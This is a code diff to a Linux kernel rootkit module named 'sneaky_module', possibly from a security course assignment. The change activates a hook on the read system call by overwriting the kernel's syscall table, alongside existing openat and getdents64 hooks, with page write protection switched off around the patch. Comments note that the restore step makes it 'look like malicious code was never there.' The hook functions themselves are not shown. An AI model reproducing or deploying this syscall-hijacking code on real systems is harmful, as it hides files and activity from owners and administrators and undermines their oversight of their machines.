@@ -157,14 +157,14 @@ static int initialize_sneaky_module(void)
   // table with the function address of our new code.
   original_openat = (void*)sys_call_table[__NR_openat];
   original_getdents64 = (void*)sys_call_table[__NR_getdents64];
-  // original_read = (void*)sys_call_table[__NR_read];
+  original_read = (void*)sys_call_table[__NR_read];
   
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
   
   sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
-  // sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
+  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
   
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);
@@ -184,7 +184,7 @@ static void exit_sneaky_module(void)
   // function address. Will look like malicious code was never there!
   sys_call_table[__NR_openat] = (unsigned long)original_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
-  // sys_call_table[__NR_read] = (unsigned long)original_read;
+  sys_call_table[__NR_read] = (unsigned long)original_read;
 
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);  
